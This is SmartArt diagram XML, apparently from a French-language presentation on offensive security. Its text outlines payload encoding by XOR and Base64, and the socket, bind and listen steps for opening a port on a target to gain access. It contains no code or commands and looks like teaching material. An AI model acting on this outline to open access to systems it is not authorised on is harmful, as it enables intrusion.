    <dgm:pt modelId="{0459F9FB-D0D3-4A09-ABAA-7984837E98A7}" type="parTrans" cxnId="{785C26C2-5AA0-4267-8B20-6C55B95A2A6D}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{92E065B6-35FC-4CF3-9355-F61A16E59521}" type="sibTrans" cxnId="{785C26C2-5AA0-4267-8B20-6C55B95A2A6D}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{B04FDFF4-541F-4EF9-B1D7-BC8D4C290277}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Techniques courantes :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{8801AF82-AA82-4AE4-ABE0-7003BA5F929C}" type="parTrans" cxnId="{0B23E9EF-D1BC-48B3-B1C1-047E86936998}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{8FCAFB54-C6B7-4D61-AC67-22BF96172152}" type="sibTrans" cxnId="{0B23E9EF-D1BC-48B3-B1C1-047E86936998}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{9870D1BC-B9D6-4F2A-8834-D3CE7F538D2E}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>XOR encoding.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{C57B9229-AFC6-4E1A-A9EF-398FAEBBAA73}" type="parTrans" cxnId="{427BD4FC-3C84-4C7C-87DA-18D6FA0AE90B}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{CE1A2404-BA9D-4652-9CE3-ACD85DD01307}" type="sibTrans" cxnId="{427BD4FC-3C84-4C7C-87DA-18D6FA0AE90B}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{14BECC4D-0463-41BA-829A-3ECF6E2683F5}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Base64.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{E3BF4DD3-EC58-467F-943E-479FF71D4958}" type="parTrans" cxnId="{B5C76657-7C97-490D-9340-C424F67121F2}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{327DC571-D6B7-4710-ACE5-C594BD274A4D}" type="sibTrans" cxnId="{B5C76657-7C97-490D-9340-C424F67121F2}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{0E7E98CB-1E39-E840-AF92-F0EB1FFCB82B}" type="pres">
      <dgm:prSet presAssocID="{FD02F742-8708-411E-9D94-A8D80F1E11D3}" presName="linear" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:dir/>
          <dgm:animLvl val="lvl"/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{8417D74B-1DF5-C241-A1C3-226EB61F7AC5}" type="pres">
      <dgm:prSet presAssocID="{805411BA-1273-4B02-B9C5-E2AE59B92367}" presName="parentLin" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{2439D453-56B8-8F44-AB2A-E66BA54BDAC9}" type="pres">
      <dgm:prSet presAssocID="{805411BA-1273-4B02-B9C5-E2AE59B92367}" presName="parentLeftMargin" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="2"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{55B0D7E6-9325-604A-B1D8-C3B90DE1135B}" type="pres">
      <dgm:prSet presAssocID="{805411BA-1273-4B02-B9C5-E2AE59B9236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557B773-3D66-8F46-84A2-659A3E7E64C4}" type="pres">
      <dgm:prSet presAssocID="{805411BA-1273-4B02-B9C5-E2AE59B92367}" presName="negativeSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{4916EADE-5588-3641-88A8-44CA0663E1DD}" type="pres">
      <dgm:prSet presAssocID="{805411BA-1273-4B02-B9C5-E2AE59B92367}" presName="childText" presStyleLbl="conFgAcc1" presStyleIdx="0" presStyleCnt="2">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{376C92E3-5C6E-8A41-BA95-80DD827998F9}" type="pres">
      <dgm:prSet presAssocID="{BAC40E6F-712E-4F4B-A346-66B457C82B26}" presName="spaceBetweenRectangles" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{2421DCBE-2CD7-4D43-8987-5BB5C139D0B7}" type="pres">
      <dgm:prSet presAssocID="{B04FDFF4-541F-4EF9-B1D7-BC8D4C290277}" presName="parentLin" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{F6712D14-AE5E-5E49-9D30-526D1E370E92}" type="pres">
      <dgm:prSet presAssocID="{B04FDFF4-541F-4EF9-B1D7-BC8D4C290277}" presName="parentLeftMargin" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="2"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{955C24C1-D9B6-8645-8271-5701D167BF1E}" type="pres">
      <dgm:prSet presAssocID="{B04FDFF4-541F-4EF9-B1D7-BC8D4C29027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8EC46CB-1F4B-5945-AB1E-E8D9FF8FA6C7}" type="pres">
      <dgm:prSet presAssocID="{B04FDFF4-541F-4EF9-B1D7-BC8D4C290277}" presName="negativeSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{1B7088A5-A4F0-DF41-9F17-DF13ED4E700B}" type="pres">
      <dgm:prSet presAssocID="{B04FDFF4-541F-4EF9-B1D7-BC8D4C29027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E926C07-0FB2-CD45-A360-9D9F656C87D5}" type="presOf" srcId="{B04FDFF4-541F-4EF9-B1D7-BC8D4C290277}" destId="{955C24C1-D9B6-8645-8271-5701D167BF1E}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{922B5D15-D065-394C-8D99-753A174B94C1}" type="presOf" srcId="{14BECC4D-0463-41BA-829A-3ECF6E2683F5}" destId="{1B7088A5-A4F0-DF41-9F17-DF13ED4E700B}" srcOrd="0" destOrd="1" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{B5DA3317-FD43-9D44-9A8B-6CD5BB43C798}" type="presOf" srcId="{7B394847-528A-472F-B296-E48E77E29778}" destId="{4916EADE-5588-3641-88A8-44CA0663E1DD}" srcOrd="0" destOrd="1" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{29B2C042-80A0-1C46-8B74-9BF8ABE69D13}" type="presOf" srcId="{805411BA-1273-4B02-B9C5-E2AE59B92367}" destId="{55B0D7E6-9325-604A-B1D8-C3B90DE1135B}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{DBAD9A55-3623-3B4F-B8CA-BA4DB6B4E482}" type="presOf" srcId="{B04FDFF4-541F-4EF9-B1D7-BC8D4C290277}" destId="{F6712D14-AE5E-5E49-9D30-526D1E370E92}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{B5C76657-7C97-490D-9340-C424F67121F2}" srcId="{B04FDFF4-541F-4EF9-B1D7-BC8D4C290277}" destId="{14BECC4D-0463-41BA-829A-3ECF6E2683F5}" srcOrd="1" destOrd="0" parTransId="{E3BF4DD3-EC58-467F-943E-479FF71D4958}" sibTransId="{327DC571-D6B7-4710-ACE5-C594BD274A4D}"/>
    <dgm:cxn modelId="{1CD8FEBF-6839-344C-815A-874E2C0D757E}" type="presOf" srcId="{FD02F742-8708-411E-9D94-A8D80F1E11D3}" destId="{0E7E98CB-1E39-E840-AF92-F0EB1FFCB82B}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{785C26C2-5AA0-4267-8B20-6C55B95A2A6D}" srcId="{805411BA-1273-4B02-B9C5-E2AE59B92367}" destId="{7B394847-528A-472F-B296-E48E77E29778}" srcOrd="1" destOrd="0" parTransId="{0459F9FB-D0D3-4A09-ABAA-7984837E98A7}" sibTransId="{92E065B6-35FC-4CF3-9355-F61A16E59521}"/>
    <dgm:cxn modelId="{941E8BC5-BE37-AE47-9598-7E1E80095BC6}" type="presOf" srcId="{805411BA-1273-4B02-B9C5-E2AE59B92367}" destId="{2439D453-56B8-8F44-AB2A-E66BA54BDAC9}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{3D6F8BC8-38DA-4A0D-8E8A-3A1BFDF05F71}" srcId="{FD02F742-8708-411E-9D94-A8D80F1E11D3}" destId="{805411BA-1273-4B02-B9C5-E2AE59B92367}" srcOrd="0" destOrd="0" parTransId="{93118E22-F11F-4566-8026-29DDDAB7B2A0}" sibTransId="{BAC40E6F-712E-4F4B-A346-66B457C82B26}"/>
    <dgm:cxn modelId="{72198DC9-2CF5-47DE-B6CA-C29DEAB434DC}" srcId="{805411BA-1273-4B02-B9C5-E2AE59B92367}" destId="{57653F9E-6056-4272-816B-054945340807}" srcOrd="0" destOrd="0" parTransId="{0CF2E016-FE44-4F0E-A85D-E3A0E5293537}" sibTransId="{903C6E98-7AE2-435B-8BD7-0D5530EE2A6E}"/>
    <dgm:cxn modelId="{B153FDCC-247D-114B-A751-A9893E1C6AFD}" type="presOf" srcId="{57653F9E-6056-4272-816B-054945340807}" destId="{4916EADE-5588-3641-88A8-44CA0663E1DD}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{0B23E9EF-D1BC-48B3-B1C1-047E86936998}" srcId="{FD02F742-8708-411E-9D94-A8D80F1E11D3}" destId="{B04FDFF4-541F-4EF9-B1D7-BC8D4C290277}" srcOrd="1" destOrd="0" parTransId="{8801AF82-AA82-4AE4-ABE0-7003BA5F929C}" sibTransId="{8FCAFB54-C6B7-4D61-AC67-22BF96172152}"/>
    <dgm:cxn modelId="{427BD4FC-3C84-4C7C-87DA-18D6FA0AE90B}" srcId="{B04FDFF4-541F-4EF9-B1D7-BC8D4C290277}" destId="{9870D1BC-B9D6-4F2A-8834-D3CE7F538D2E}" srcOrd="0" destOrd="0" parTransId="{C57B9229-AFC6-4E1A-A9EF-398FAEBBAA73}" sibTransId="{CE1A2404-BA9D-4652-9CE3-ACD85DD01307}"/>
    <dgm:cxn modelId="{887F38FE-D5B2-0F45-990F-2C2616566B1F}" type="presOf" srcId="{9870D1BC-B9D6-4F2A-8834-D3CE7F538D2E}" destId="{1B7088A5-A4F0-DF41-9F17-DF13ED4E700B}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{963CB9DB-23DF-5540-9C43-8B69C309E562}" type="presParOf" srcId="{0E7E98CB-1E39-E840-AF92-F0EB1FFCB82B}" destId="{8417D74B-1DF5-C241-A1C3-226EB61F7AC5}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{682097DA-39DA-D04A-93D2-9BF8876D1523}" type="presParOf" srcId="{8417D74B-1DF5-C241-A1C3-226EB61F7AC5}" destId="{2439D453-56B8-8F44-AB2A-E66BA54BDAC9}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{19849920-0B74-FC4B-880D-5106DE76012D}" type="presParOf" srcId="{8417D74B-1DF5-C241-A1C3-226EB61F7AC5}" destId="{55B0D7E6-9325-604A-B1D8-C3B90DE1135B}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{654C36D9-B4D9-C34A-B7F1-2934DD8BFC5A}" type="presParOf" srcId="{0E7E98CB-1E39-E840-AF92-F0EB1FFCB82B}" destId="{F557B773-3D66-8F46-84A2-659A3E7E64C4}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{68670841-B489-B942-B99F-6D8458208D14}" type="presParOf" srcId="{0E7E98CB-1E39-E840-AF92-F0EB1FFCB82B}" destId="{4916EADE-5588-3641-88A8-44CA0663E1DD}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{B4A912F2-20F7-234F-9DED-FFBF1830B1AA}" type="presParOf" srcId="{0E7E98CB-1E39-E840-AF92-F0EB1FFCB82B}" destId="{376C92E3-5C6E-8A41-BA95-80DD827998F9}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{38416BB5-794E-5943-86AA-37AC43C8B67C}" type="presParOf" srcId="{0E7E98CB-1E39-E840-AF92-F0EB1FFCB82B}" destId="{2421DCBE-2CD7-4D43-8987-5BB5C139D0B7}" srcOrd="4" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{F5D361E8-CFF0-764F-B07D-BFC75142F76D}" type="presParOf" srcId="{2421DCBE-2CD7-4D43-8987-5BB5C139D0B7}" destId="{F6712D14-AE5E-5E49-9D30-526D1E370E92}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{47BD3A8E-EF0B-454D-96D1-912152490A11}" type="presParOf" srcId="{2421DCBE-2CD7-4D43-8987-5BB5C139D0B7}" destId="{955C24C1-D9B6-8645-8271-5701D167BF1E}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{99416120-5C52-A64F-9B5E-78D873807703}" type="presParOf" srcId="{0E7E98CB-1E39-E840-AF92-F0EB1FFCB82B}" destId="{38EC46CB-1F4B-5945-AB1E-E8D9FF8FA6C7}" srcOrd="5" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{E3646624-DA43-AC48-9762-6B5DF0C52A6B}" type="presParOf" srcId="{0E7E98CB-1E39-E840-AF92-F0EB1FFCB82B}" destId="{1B7088A5-A4F0-DF41-9F17-DF13ED4E700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AC7A80F-B680-4146-9940-45829E8C171E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B0F8637-01E8-4B52-A9F0-FCDCC9944519}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>But :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{87E2A870-6A11-4424-8263-641AB8A27435}" type="parTrans" cxnId="{A5FF2F00-26F5-4A2F-BCE5-B0CE154C13B6}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{D2E6475B-82B7-4D6B-A141-06273403298C}" type="sibTrans" cxnId="{A5FF2F00-26F5-4A2F-BCE5-B0CE154C13B6}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{0158D502-DB52-46D4-AA1B-75465C38989E}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Ouvrir un port sur la cible pour y accéder.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{3C441AF6-B6F7-485C-ABE6-178C64D2C2F4}" type="parTrans" cxnId="{08F98109-9968-40A1-AA3A-1E1E3E324071}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{56B99E9A-4697-4B38-86B3-9A506AA6FCA4}" type="sibTrans" cxnId="{08F98109-9968-40A1-AA3A-1E1E3E324071}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{6B524840-1B4A-42FD-8EE8-8A250F4791E7}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Étapes principales :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{7C201A4E-8DE2-4218-8A26-B253D705F703}" type="parTrans" cxnId="{1BD90041-79F6-4D2B-AF25-6A40EA387B8D}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{025475AF-02CD-4D5A-ACA5-812429EACC5D}" type="sibTrans" cxnId="{1BD90041-79F6-4D2B-AF25-6A40EA387B8D}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{6CC57B05-B47E-43B1-8049-2CFD1153C1B8}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Création du socket.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{151FF100-633E-4F68-91BD-EC81223620F6}" type="parTrans" cxnId="{862C3FCB-5965-4F45-84D6-8F1E1763CBA0}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{32B2DE5A-327D-4637-91E5-C86CC59528EA}" type="sibTrans" cxnId="{862C3FCB-5965-4F45-84D6-8F1E1763CBA0}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{5F531FFE-7AF3-41CD-A059-30446C246A7C}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Bind au port.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{592A467B-48B0-426B-9260-B1B5CE7CFF48}" type="parTrans" cxnId="{CE8C743E-E319-48B8-9D97-DC0AB23D3A4D}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{AB5060B3-C872-48B1-B30E-58032E099328}" type="sibTrans" cxnId="{CE8C743E-E319-48B8-9D97-DC0AB23D3A4D}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{491F5C6A-5EC1-44B8-8100-7D8DB245EB11}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Écoute et acceptation des connexions.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{5D4917DE-51BE-4FA9-9E53-630952317C0F}" type="parTrans" cxnId="{B713786B-89F4-4C14-8491-5D671B9373CC}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{D36B1EB7-4184-43B7-90D7-237443563C62}" type="sibTrans" cxnId="{B713786B-89F4-4C14-8491-5D671B9373CC}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{3B6B6062-B9A0-F142-B600-2307F8678E8C}" type="pres">
      <dgm:prSet presAssocID="{1AC7A80F-B680-4146-9940-45829E8C171E}" presName="linear" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:dir/>
          <dgm:animLvl val="lvl"/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{F5B0E0A6-80D9-6340-926D-600C09AAA371}" type="pres">
      <dgm:prSet presAssocID="{DB0F8637-01E8-4B52-A9F0-FCDCC9944519}" presName="parentLin" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{CCF95279-28E3-AA4D-9089-B27DB541495A}" type="pres">
      <dgm:prSet presAssocID="{DB0F8637-01E8-4B52-A9F0-FCDCC9944519}" presName="parentLeftMargin" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="2"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{1B1D3F02-FDDB-6840-947E-51F484BE5D2F}" type="pres">
      <dgm:prSet presAssocID="{DB0F8637-01E8-4B52-A9F0-FCDCC994451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B0E1094-6197-8440-B9DF-700BCEC8C0C9}" type="pres">
      <dgm:prSet presAssocID="{DB0F8637-01E8-4B52-A9F0-FCDCC9944519}" presName="negativeSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{AD13EA0E-436A-A744-983A-8A14E416496F}" type="pres">
      <dgm:prSet presAssocID="{DB0F8637-01E8-4B52-A9F0-FCDCC9944519}" presName="childText" presStyleLbl="conFgAcc1" presStyleIdx="0" presStyleCnt="2">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{FAB01CF3-4FC7-5048-AF30-5EF68E2370E6}" type="pres">
      <dgm:prSet presAssocID="{D2E6475B-82B7-4D6B-A141-06273403298C}" presName="spaceBetweenRectangles" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{C5405049-10FA-1342-8FB4-BA6DA1117AA9}" type="pres">
      <dgm:prSet presAssocID="{6B524840-1B4A-42FD-8EE8-8A250F4791E7}" presName="parentLin" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{C20AF52E-DD95-4D44-A4E5-041F225F3F5E}" type="pres">
      <dgm:prSet presAssocID="{6B524840-1B4A-42FD-8EE8-8A250F4791E7}" presName="parentLeftMargin" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="2"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{CCE9B90D-2AA0-9140-9AD7-57835614303A}" type="pres">
      <dgm:prSet presAssocID="{6B524840-1B4A-42FD-8EE8-8A250F4791E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15C7DD8-5FE7-E04C-BD75-3882DCCC1325}" type="pres">
      <dgm:prSet presAssocID="{6B524840-1B4A-42FD-8EE8-8A250F4791E7}" presName="negativeSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{EB9E70A2-6D0E-AC4B-982D-90177EDBBBED}" type="pres">
      <dgm:prSet presAssocID="{6B524840-1B4A-42FD-8EE8-8A250F4791E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5FF2F00-26F5-4A2F-BCE5-B0CE154C13B6}" srcId="{1AC7A80F-B680-4146-9940-45829E8C171E}" destId="{DB0F8637-01E8-4B52-A9F0-FCDCC9944519}" srcOrd="0" destOrd="0" parTransId="{87E2A870-6A11-4424-8263-641AB8A27435}" sibTransId="{D2E6475B-82B7-4D6B-A141-06273403298C}"/>
    <dgm:cxn modelId="{08F98109-9968-40A1-AA3A-1E1E3E324071}" srcId="{DB0F8637-01E8-4B52-A9F0-FCDCC9944519}" destId="{0158D502-DB52-46D4-AA1B-75465C38989E}" srcOrd="0" destOrd="0" parTransId="{3C441AF6-B6F7-485C-ABE6-178C64D2C2F4}" sibTransId="{56B99E9A-4697-4B38-86B3-9A506AA6FCA4}"/>
    <dgm:cxn modelId="{2F8DA519-BA66-A642-A147-584CF3F161AA}" type="presOf" srcId="{DB0F8637-01E8-4B52-A9F0-FCDCC9944519}" destId="{1B1D3F02-FDDB-6840-947E-51F484BE5D2F}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{787A8023-DBB1-CB48-ACB3-BB29E3E31E0A}" type="presOf" srcId="{6B524840-1B4A-42FD-8EE8-8A250F4791E7}" destId="{CCE9B90D-2AA0-9140-9AD7-57835614303A}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{AEA65D26-374A-3D41-A08E-B495739CEC81}" type="presOf" srcId="{491F5C6A-5EC1-44B8-8100-7D8DB245EB11}" destId="{EB9E70A2-6D0E-AC4B-982D-90177EDBBBED}" srcOrd="0" destOrd="2" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{CE8C743E-E319-48B8-9D97-DC0AB23D3A4D}" srcId="{6B524840-1B4A-42FD-8EE8-8A250F4791E7}" destId="{5F531FFE-7AF3-41CD-A059-30446C246A7C}" srcOrd="1" destOrd="0" parTransId="{592A467B-48B0-426B-9260-B1B5CE7CFF48}" sibTransId="{AB5060B3-C872-48B1-B30E-58032E099328}"/>
    <dgm:cxn modelId="{97078B3F-B955-AC42-B6B6-83E60D32605C}" type="presOf" srcId="{DB0F8637-01E8-4B52-A9F0-FCDCC9944519}" destId="{CCF95279-28E3-AA4D-9089-B27DB541495A}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{5B6AD440-AF44-8941-B04C-A5894A58B565}" type="presOf" srcId="{0158D502-DB52-46D4-AA1B-75465C38989E}" destId="{AD13EA0E-436A-A744-983A-8A14E416496F}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
